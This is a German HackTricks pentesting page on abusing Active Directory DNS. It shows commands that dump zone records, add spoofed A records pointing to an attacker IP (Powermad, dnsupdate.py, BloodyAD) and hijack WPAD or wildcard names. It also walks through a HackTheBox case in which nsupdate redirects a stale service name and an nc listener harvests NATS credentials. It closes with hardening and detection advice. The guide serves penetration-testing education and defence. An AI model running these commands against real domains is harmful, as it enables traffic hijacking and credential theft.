# AD-DNS-Einträge

{{#include ../../banners/hacktricks-training.md}}

Standardmäßig kann **jeder Benutzer** in Active Directory **alle DNS-Einträge** in den DNS-Zonen der Domäne oder Gesamtstruktur **enumerieren**, ähnlich wie bei einem Zonentransfer (Benutzer können die untergeordneten Objekte einer DNS-Zone in einer AD-Umgebung auflisten).

Das Tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ermöglicht die **Enumeration** und den **Export** **aller DNS-Einträge** in der Zone zur Aufklärung interner Netzwerke.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) fügt JSON/Greppable-Ausgabe (`--json`), eine multi-threaded DNS-Auflösung und Unterstützung für TLS 1.2/1.3 beim Binden an LDAPS hinzu

Weitere Informationen finden Sie unter [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Erstellen / Ändern von Records (ADIDNS spoofing)

Da die Gruppe **Authenticated Users** standardmäßig über **Create Child** in der Zonen-DACL verfügt, kann jedes Domainkonto (oder Computerkonto) zusätzliche Records registrieren. Dies kann für Traffic-Hijacking, NTLM-Relay-Coercion oder sogar die vollständige Kompromittierung der Domain verwendet werden.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py wird mit Impacket ≥0.12.0 ausgeliefert)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Allgemeine Angriffsprimitiven

1. **Wildcard record** – `*.<zone>` verwandelt den AD-DNS-Server in einen unternehmensweiten Responder ähnlich wie LLMNR/NBNS-Spoofing. Dies kann missbraucht werden, um NTLM-Hashes abzugreifen oder sie an LDAP/SMB weiterzuleiten.  (Erfordert, dass die WINS-Suche deaktiviert ist.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – `wpad` hinzufügen (oder einen **NS**-Record, der auf einen Angreifer-Host zeigt, um die Global-Query-Block-List zu umgehen) und ausgehende HTTP-Anfragen transparent proxien, um Credentials abzugreifen. Microsoft hat die Wildcard-/DNAME-Umgehungen (CVE-2018-8320) gepatcht, aber **NS-records funktionieren weiterhin**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – die IP-Adresse übernehmen, die zuvor zu einer Workstation gehörte; der zugehörige DNS-Eintrag wird weiterhin aufgelöst. Dadurch werden resource-based constrained delegation oder Shadow-Credentials-Angriffe ermöglicht, ohne DNS überhaupt anzufassen.
4. **DHCP → DNS spoofing** – bei einer standardmäßigen Windows-DHCP+DNS-Bereitstellung kann ein nicht authentifizierter Angreifer im selben Subnetz jeden vorhandenen A-Record (einschließlich Domain Controllern) überschreiben, indem er gefälschte DHCP-Anfragen sendet, die dynamische DNS-Updates auslösen (Akamai „DDSpoof“, 2023). Dies ermöglicht Machine-in-the-Middle-Angriffe gegen Kerberos/LDAP und kann zur vollständigen Übernahme der Domäne führen.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – den `dNSHostName` eines von dir kontrollierten Maschinenkontos ändern, einen passenden A-Record registrieren und anschließend ein Zertifikat für diesen Namen anfordern, um den DC zu imitieren. Tools wie **Certipy** oder **BloodyAD** automatisieren den Ablauf vollständig.

---

### Hijacking interner Services über veraltete dynamische Records (NATS-Fallstudie)

Wenn dynamische Updates für alle authentifizierten Benutzer offenstehen, **kann ein deregistrierter Servicename erneut beansprucht und auf Angreifer-Infrastruktur umgeleitet werden**. Der Mirage-HTB-DC gab den Hostnamen `nats-svc.mirage.htb` nach dem DNS-Scavenging preis, sodass jeder Benutzer mit niedrigen Berechtigungen Folgendes tun konnte:<sup>[[3]](#references)</sup>

1. **Bestätigen, dass der Record fehlt**, und die SOA mit `dig` ermitteln:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Erstellen Sie den Eintrag** für eine externe/VPN-Schnittstelle neu, die sie kontrollieren:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Den plaintext service imitieren**. NATS-Clients erwarten ein `INFO { ... }`-Banner, bevor sie Zugangsdaten senden. Daher reicht es aus, ein legitimes Banner vom echten Broker zu kopieren, um Secrets zu sammeln:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Jeder Client, der den hijacked Namen auflöst, leakt sofort seinen JSON-`CONNECT`-Frame (einschließlich `"user"`/`"pass"`) an den Listener. Wenn man die offizielle `nats-server -V`-Binary auf dem Angreifer-Host ausführt, deren Log-Redaction deaktiviert oder die Session einfach mit Wireshark sniffed, erhält man dieselben Credentials im Klartext, da TLS optional war.

4. **Mit den erfassten Creds pivoten** – in Mirage ermöglichte der gestohlene NATS-Account den Zugriff auf JetStream. Dadurch wurden historische Authentifizierungsereignisse offengelegt, die wiederverwendbare AD-Benutzernamen und Passwörter enthielten.

Dieses Muster gilt für jeden AD-integrierten Service, der auf ungesicherten TCP-Handshakes basiert (HTTP-APIs, RPC, MQTT usw.): Sobald der DNS-Record hijacked wurde, wird der Angreifer zum Service.

---

## Erkennung & Härtung

* Verweigere **Authenticated Users** das Recht *Create all child objects* auf sensiblen Zonen und delegiere dynamische Updates an einen dedizierten, von DHCP verwendeten Account.
* Wenn dynamische Updates erforderlich sind, setze die Zone auf **Secure-only** und aktiviere **Name Protection** in DHCP, damit nur das Besitzer-Computerobjekt seinen eigenen Record überschreiben kann.
* Überwache die DNS-Server-Event-IDs 257/252 (dynamisches Update), 770 (Zonentransfer) sowie LDAP-Schreibvorgänge nach `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blockiere gefährliche Namen (`wpad`, `isatap`, `*`) mit einem absichtlich harmlosen Record oder über die Global Query Block List.
* Halte DNS-Server gepatcht – beispielsweise erreichten RCE-Bugs CVE-2024-26224 und CVE-2024-26231 einen **CVSS-Wert von 9.8** und sind remote gegen Domain Controller ausnutzbar.

## Referenzen

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, weiterhin die De-facto-Referenz für Wildcard-/WPAD-Angriffe)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dez. 2023)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
